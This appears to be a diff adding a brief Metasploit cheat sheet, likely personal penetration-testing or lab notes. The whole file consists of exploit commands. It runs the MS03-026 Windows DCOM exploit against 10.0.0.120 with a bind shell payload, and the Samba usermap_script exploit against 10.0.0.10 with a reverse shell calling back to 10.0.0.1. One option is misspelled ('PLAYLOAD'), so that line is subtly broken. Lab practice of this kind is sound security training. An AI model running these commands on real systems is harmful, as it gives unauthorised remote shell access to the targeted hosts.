@@ -1,0 +1,20 @@
+
+
+  search dcom
+  use exploit/windows/dcerpc/ms03_026_dcom
+  show options
+  set RHOSTS 10.0.0.120
+  set PAYLOAD windows/shell/bind_tcp
+  exploit
+  
+  -----------------------------------------------
+  
+  msfcli exploit/multi/samba/usermap_script RHOST=10.0.0.10 PLAYLOAD=cmd/unix/reverse LHOST=10.0.0.1 E      # E - execute
+
+  msfcli exploit/multi/samba/usermap_script O        # show available Options
+  msfcli exploit/multi/samba/usermap_script P        # show available Payload for this Exploit
+
+  -----------------------------------------------
+    
+  
+  
